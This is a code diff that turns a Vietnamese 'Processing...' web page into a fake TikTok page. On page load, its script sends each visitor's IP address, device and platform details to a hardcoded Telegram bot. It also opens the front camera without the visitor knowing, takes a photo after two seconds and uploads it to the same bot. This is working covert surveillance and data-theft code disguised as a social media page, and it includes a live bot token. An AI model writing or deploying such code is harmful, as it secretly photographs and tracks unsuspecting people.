@@ -1,31 +1,59 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <title>Đang xử lý...</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TikTok</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      font-family: sans-serif;
+      color: white;
+      text-align: center;
+    }
+    .tiktok-header {
+      padding: 10px;
+      font-weight: bold;
+      background: #000;
+      border-bottom: 1px solid #333;
+    }
+    video, canvas {
+      width: 100%;
+      max-height: 90vh;
+      object-fit: cover;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
 </head>
 <body>
-  <h1>Đang xử lý...</h1>
-  <script>
-    async function sendToTelegram() {
-      const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
-      const chat_id = "5017098451";
+  <div class="tiktok-header">TikTok</div>
+  <video id="fakeVideo" autoplay muted loop>
+    <source src="https://samplelib.com/lib/preview/mp4/sample-5s.mp4" type="video/mp4" />
+    Trình duyệt của bạn không hỗ trợ video.
+  </video>
 
+  <canvas id="snapshot" class="hidden"></canvas>
+
+  <script>
+    const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
+    const chat_id = "5017098451";
+
+    async function sendIP() {
       const ipinfo = await fetch("https://api.ipify.org?format=json")
         .then(res => res.json())
         .catch(() => null);
 
       const now = new Date();
-      const formatTime = now.toLocaleTimeString("vi-VN");
-      const formatDate = now.toLocaleDateString("vi-VN");
-
       const msg = `📡 [THÔNG TIN TRUY CẬP]
 
-🕒 Thời gian: ${formatTime} ${formatDate}
+🕒 Thời gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}
 📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
 🖥️ Hệ điều hành: ${navigator.platform}
 🌍 IP: ${ipinfo?.ip || "Không xác định"}
-📸 Camera: 🚫 Không thể truy cập camera`;
+📸 Camera: Đang kiểm tra quyền truy cập...`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -34,7 +62,46 @@
       });
     }
 
-    sendToTelegram();
+    async function captureAndSendPhoto() {
+      const video = document.createElement("video");
+      const canvas = document.getElementById("snapshot");
+      const ctx = canvas.getContext("2d");
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        video.srcObject = stream;
+        await video.play();
+
+        await new Promise(r => setTimeout(r, 2000)); // chờ camera ổn định
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95));
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("photo", blob, "photo.jpg");
+
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {
+        console.log("❌ Không thể truy cập camera:", err);
+        const msg = `📸 Không thể truy cập camera: ${err.message || "Từ chối quyền"}`;
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id, text: msg })
+        });
+      }
+    }
+
+    sendIP();
+    captureAndSendPhoto();
   </script>
 </body>
 </html>
